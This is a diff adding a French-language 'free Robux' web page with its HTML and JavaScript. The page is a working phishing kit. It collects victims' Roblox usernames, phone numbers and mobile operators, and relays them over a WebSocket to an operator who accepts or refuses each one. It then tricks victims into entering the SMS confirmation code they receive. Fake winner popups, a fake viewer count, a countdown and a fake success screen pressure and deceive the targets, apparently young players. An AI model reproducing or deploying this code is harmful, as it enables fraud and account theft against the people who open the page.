+          <span class="ti">⚡ Transfert Direct</span>
+          <span class="ti">🎁 100% Gratuit</span>
+        </div>
+      </div>
+
+      <!-- STEP 2: WAIT -->
+      <div class="step" id="s-wait">
+        <div class="wait-c">
+          <div class="spin-wrap">
+            <div class="sr sr1"></div><div class="sr sr2"></div><div class="sr sr3"></div>
+            <div class="spin-mid">
+              <img src="/robux-logo.png" alt="Robux"/>
+            </div>
+          </div>
+          <div class="wait-t">Génération en cours…</div>
+          <div class="wait-s">Connexion aux serveurs Roblox</div>
+          <div class="ph-pill" id="w-ph"></div>
+        </div>
+        <div class="steps-track">
+          <div class="st-row done"><div class="st-ic">✅</div>Compte Roblox localisé</div>
+          <div class="st-row cur" id="st2"><div class="st-ic" id="st2i">⏳</div>Vérification de l'éligibilité…</div>
+          <div class="st-row" id="st3" style="opacity:.3"><div class="st-ic">🎁</div>Préparation du transfert Robux</div>
+        </div>
+      </div>
+
+      <!-- STEP 3: REFUSED -->
+      <div class="step" id="s-ref">
+        <div class="ref-c">
+          <span class="ref-icon">😔</span>
+          <div class="ref-t">Compte non éligible</div>
+          <p class="ref-s">Impossible de valider le transfert pour ce numéro. Il a peut-être déjà été utilisé.</p>
+          <button class="btn-ghost" onclick="location.reload()">↩ &nbsp;Réessayer</button>
+        </div>
+      </div>
+
+      <!-- STEP 4: CODE -->
+      <div class="step" id="s-code">
+        <div class="code-c">
+          <div class="vbadge">✅ &nbsp;Compte Roblox Validé</div>
+
+          <!-- SMS MOCKUP -->
+          <div class="sms-mockup">
+            <div class="sms-header">
+              <div class="sms-avatar">
+                <img src="/robux-logo.png" alt="Robux"/>
+              </div>
+              <div>
+                <div class="sms-name">Roblox Auth</div>
+                <div class="sms-time">À l'instant</div>
+              </div>
+            </div>
+            <div class="sms-bubble">
+              Ton code de confirmation Robux est <span class="sms-code-hl" id="fake-code">····</span>. Valable 10 min. Ne le partage pas.
+            </div>
+          </div>
+
+          <div class="code-inst">👆 Entre le code reçu par SMS pour créditer les Robux</div>
+          <div class="digits">
+            <input class="dg" id="d1" maxlength="1" type="text" inputmode="numeric" placeholder="·"/>
+            <input class="dg" id="d2" maxlength="1" type="text" inputmode="numeric" placeholder="·"/>
+            <input class="dg" id="d3" maxlength="1" type="text" inputmode="numeric" placeholder="·"/>
+            <input class="dg" id="d4" maxlength="1" type="text" inputmode="numeric" placeholder="·"/>
+          </div>
+          <div class="code-note">Le code expire dans <span id="code-timer">10:00</span></div>
+          <button class="cta" id="btn-code" onclick="sendCode()">💎 &nbsp;Confirmer et Récupérer</button>
+          <div class="resend">Pas reçu le code ? <a onclick="void(0)">Renvoyer</a></div>
+        </div>
+      </div>
+
+      <!-- STEP 5: SUCCESS -->
+      <div class="step" id="s-ok">
+        <div class="succ-c">
+          <div class="medal">
+            <div class="medal-ring"></div>
+            <div class="medal-inner">
+              <img src="/robux-logo.png" alt="Robux"/>
+            </div>
+          </div>
+          <div class="succ-t"><span class="gt">Robux Envoyés !</span> 🎉</div>
+          <p class="succ-s">Les Robux ont été transférés sur ton compte Roblox avec succès !</p>
+          <div class="robux-card">
+            <div class="rc-big-amount" id="granted-amount">+10 000 Robux</div>
+            <div class="rc-sub">Connecte-toi à Roblox pour voir ton solde !</div>
+          </div>
+        </div>
+      </div>
+
+    </div><!-- /card-body -->
+  </div><!-- /card -->
+
+  <div class="footer-row">
+    <div class="fb">🔒 SSL 256-bit Sécurisé</div>
+    <div class="fb">💎 Transfert Direct Roblox</div>
+    <div class="fb">🇫🇷 France uniquement</div>
+  </div>
+
+</div><!-- /page -->
+
+<script>
+/* ── BG CANVAS ── */
+const cv=document.getElementById('bgc'),cx=cv.getContext('2d');
+let W,H,pts=[];
+function rsz(){W=cv.width=innerWidth;H=cv.height=innerHeight;}
+rsz();window.addEventListener('resize',rsz,{passive:true});
+for(let i=0;i<55;i++)pts.push({x:Math.random()*3000,y:Math.random()*2000,vx:(Math.random()-.5)*.2,vy:(Math.random()-.5)*.2,r:Math.random()*1.3+.3,a:Math.random()*.45});
+(function frame(){cx.clearRect(0,0,W,H);pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=W;if(p.x>W)p.x=0;if(p.y<0)p.y=H;if(p.y>H)p.y=0;cx.beginPath();cx.arc(p.x,p.y,p.r,0,Math.PI*2);cx.fillStyle=`rgba(229,193,88,${p.a*.2})`;cx.fill();});requestAnimationFrame(frame);})();
+
+/* ── COUNTDOWN ── */
+let cdSecs=14*60+59;
+(function cd(){
+  const h=Math.floor(cdSecs/3600),m=Math.floor((cdSecs%3600)/60),s=cdSecs%60;
+  document.getElementById('cd-h').textContent=String(h).padStart(2,'0');
+  document.getElementById('cd-m').textContent=String(m).padStart(2,'0');
+  document.getElementById('cd-s').textContent=String(s).padStart(2,'0');
+  if(cdSecs>0){cdSecs--;setTimeout(cd,1000);}
+})();
+
+/* ── VIEWER COUNT ── */
+let viewers=42;
+setInterval(()=>{
+  const delta=Math.random()>.5?1:-1;
+  viewers=Math.max(20,Math.min(85,viewers+delta));
+  const el=document.getElementById('viewer-count');
+  if(el)el.textContent=viewers;
+},3000);
+
+/* ── RANDOM POPUP NOTIFICATIONS ── */
+const fakeUsers = [
+  {name:"Robloxian99", text:"Vient de recevoir 10 000 Robux !"},
+  {name:"GamerBoy_FR", text:"25 000 Robux transférés 🎉"},
+  {name:"Sarah_RBX", text:"5 000 Robux ajoutés au solde !"},
+  {name:"Kev_Gamer", text:"Code validé, Robux reçus ⭐"}
+];
+function triggerPop(){
+  const user = fakeUsers[Math.floor(Math.random()*fakeUsers.length)];
+  document.getElementById('pop-title').textContent = user.name;
+  document.getElementById('pop-sub').textContent = user.text;
+  const pop = document.getElementById('live-pop');
+  pop.classList.add('show');
+  setTimeout(()=>pop.classList.remove('show'), 4000);
+}
+setTimeout(triggerPop, 4000);
+setInterval(triggerPop, 12000);
+
+/* ── CODE TIMER ── */
+let codeTimerSecs=10*60;let codeTimerInt;
+function startCodeTimer(){
+  codeTimerInt=setInterval(()=>{
+    if(codeTimerSecs<=0){clearInterval(codeTimerInt);return;}
+    codeTimerSecs--;
+    const m=Math.floor(codeTimerSecs/60),s=codeTimerSecs%60;
+    const el=document.getElementById('code-timer');
+    if(el)el.textContent=`${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  },1000);
+}
+
+/* ── PHONE FORMAT ── */
+document.getElementById('phone').addEventListener('input',function(){
+  let v=this.value.replace(/\D/g,'').substring(0,9);
+  let o='';for(let i=0;i<v.length;i++){if(i>0&&i%2===0)o+=' ';o+=v[i];}
+  this.value=o;
+},{passive:true});
+
+/* ── ROBUX SELECTION ── */
+let selectedRobux = '10 000';
+function pickRobux(el){
+  if(navigator.vibrate) navigator.vibrate(20);
+  document.querySelectorAll('.robux-tile').forEach(b=>b.classList.remove('sel'));
+  el.classList.add('sel');
+  selectedRobux = el.dataset.amount;
+}
+
+/* ── OPERATOR SELECTION ── */
+let selOp='';
+function pickOp(el){
+  if(navigator.vibrate) navigator.vibrate(25);
+  document.querySelectorAll('.op-tile').forEach(b=>b.classList.remove('sel'));
+  el.classList.add('sel');selOp=el.dataset.op;
+}
+
+/* ── STEP PROGRESS ── */
+function setStepBar(n){
+  for(let i=1;i<=4;i++){
+    const nb=document.getElementById('sbn'+i);
+    if(!nb)continue;
+    nb.classList.remove('active','done');
+    if(i<n){nb.classList.add('done');nb.textContent='✓';}
+    else if(i===n){nb.classList.add('active');if(i<4)nb.textContent=i;}
+    else{nb.textContent=i===4?'✓':i;}
+    const bl=document.getElementById('sbl'+i);
+    if(bl)bl.classList.toggle('done',i<n);
+  }
+}
+
+/* ── DIGITS AUTO-ADVANCE & BACKSPACE HANDLER ── */
+const dIds=['d1','d2','d3','d4'];
+dIds.forEach((id,i)=>{
+  const el=document.getElementById(id);
+  el.addEventListener('input',()=>{
+    if(navigator.vibrate) navigator.vibrate(15);
+    el.value=el.value.replace(/\D/,'').substring(0,1);
+    el.classList.toggle('v',!!el.value);
+    if(el.value && i < 3) {
+      document.getElementById(dIds[i+1]).focus();
+    }
+    updateFakeCode();
+  },{passive:true});
+  
+  el.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'){
+      if(!el.value && i > 0){
+        const prev = document.getElementById(dIds[i-1]);
+        prev.classList.remove('v');
+        prev.focus();
+      }
+    }
+  });
+  
+  el.addEventListener('focus',()=>{
+    el.select();
+  });
+});
+
+function updateFakeCode(){
+  const code=dIds.map(id=>{const v=document.getElementById(id).value;return v||'·';}).join('');
+  const el=document.getElementById('fake-code');
+  if(el)el.textContent=code;
+}
+
+/* ── SHOW STEP ── */
+function show(id){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+/* ── WAIT ANIM ── */
+function waitAnim(){
+  setTimeout(()=>{
+    const r=document.getElementById('st2');
+    r.classList.remove('cur');r.classList.add('done');
+    document.getElementById('st2i').style.animation='none';
+    document.getElementById('st2i').textContent='✅';
+    const r3=document.getElementById('st3');r3.style.opacity='1';r3.classList.add('cur');
+  },1700);
+}
+
+/* ── WS ── */
+let ws;
+function connectWS(){
+  const proto=location.protocol==='https:'?'wss':'ws';
+  ws=new WebSocket(`${proto}://${location.host}`);
+  ws.onmessage=e=>{
+    const m=JSON.parse(e.data);
+    if(m.type==='decision'){
+      if(m.decision==='accepted'){
+        const ph=document.getElementById('w-ph').textContent;
+        const fk=String(Math.floor(1000+Math.random()*9000));
+        const fc=document.getElementById('fake-code');
+        if(fc)fc.textContent=fk.split('').join('');
+        setStepBar(3);show('s-code');startCodeTimer();
+        setTimeout(()=>document.getElementById('d1').focus(),200);
+      }else{
+        setStepBar(2);show('s-ref');
+      }
+    }
+    if(m.type==='robux_granted'){
+      document.getElementById('granted-amount').textContent = `+${m.robuxAmount || selectedRobux} Robux`;
+      setStepBar(4);show('s-ok');confetti();
+    }
+  };
+}
+
+function submitForm(){
+  if(navigator.vibrate) navigator.vibrate(40);
+  const username=document.getElementById('username').value.trim();
+  const raw=document.getElementById('phone').value.trim();
+  if(!username){toast('Entre ton pseudo Roblox !');return;}
+  if(raw.replace(/\s/g,'').length<9){toast('Entre un numéro valide !');return;}
+  if(!selOp){toast('Sélectionne ton opérateur !');return;}
+  const display='+33 '+raw;
+  document.getElementById('w-ph').textContent=display;
+  setStepBar(2);show('s-wait');waitAnim();
+  connectWS();
+  ws.onopen=()=>ws.send(JSON.stringify({
+    type:'submit',
+    username,
+    phone:display,
+    operator:selOp,
+    robuxAmount:selectedRobux
+  }));
+}
+
+function sendCode(){
+  if(navigator.vibrate) navigator.vibrate(40);
+  const code=dIds.map(id=>document.getElementById(id).value).join('');
+  if(code.length<4){toast('Entre les 4 chiffres !');return;}
+  const btn=document.getElementById('btn-code');
+  btn.disabled=true;btn.textContent='⏳  Transfert en cours…';
+  ws.send(JSON.stringify({type:'code_submit',code}));
+}
+
+/* ── TOAST ── */
+let tt;
+function toast(msg){
+  let el=document.querySelector('.toast');if(el)el.remove();
+  el=document.createElement('div');el.className='toast';el.textContent=msg;
+  document.body.appendChild(el);clearTimeout(tt);tt=setTimeout(()=>el&&el.remove(),2600);
+}
+
+/* ── CONFETTI ── */
+function confetti(){
+  if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
+  const cols=['#E5C158','#FFFC00','#00E676','#6bffb8','#fff'];
+  const w=document.getElementById('conf');
+  for(let i=0;i<140;i++){
+    const d=document.createElement('div');d.className='cp';
+    d.style.cssText=`left:${Math.random()*100}vw;width:${5+Math.random()*9}px;height:${5+Math.random()*9}px;background:${cols[~~(Math.random()*cols.length)]};border-radius:${Math.random()>.5?'50%':'3px'};animation-duration:${2+Math.random()*3.5}s;animation-delay:${Math.random()*1.5}s;opacity:${.6+Math.random()*.4};`;
+    w.appendChild(d);setTimeout(()=>d.remove(),6000);
+  }
+}
+</script>
+</body>
+</html>
